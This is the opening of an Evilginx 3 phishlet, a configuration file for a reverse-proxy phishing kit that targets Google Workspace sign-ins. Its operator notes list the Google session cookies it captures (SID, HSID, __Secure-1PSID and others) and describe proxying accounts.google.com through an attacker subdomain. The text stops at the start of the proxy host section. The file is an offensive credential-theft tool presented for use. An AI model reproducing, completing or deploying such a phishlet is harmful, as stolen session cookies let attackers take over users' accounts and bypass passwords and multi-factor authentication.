# =============================================================================
# Evilginx 3 Phishlet — Google Workspace
# Generated from google.json phishlet template
# =============================================================================
# OPERATOR NOTES:
#   Session cookies captured: SID, HSID, SSID, APISID, SAPISID,
#     __Secure-1PSID, __Secure-3PSID, NID, OSID, LSID
#   Landing subdomain: accounts.google.com proxied via {{.PhishSub}}.{{.Hostname}}
# =============================================================================

author: "@glnt-phish-kit"
min_ver: "3.9.9"

proxy_hosts:
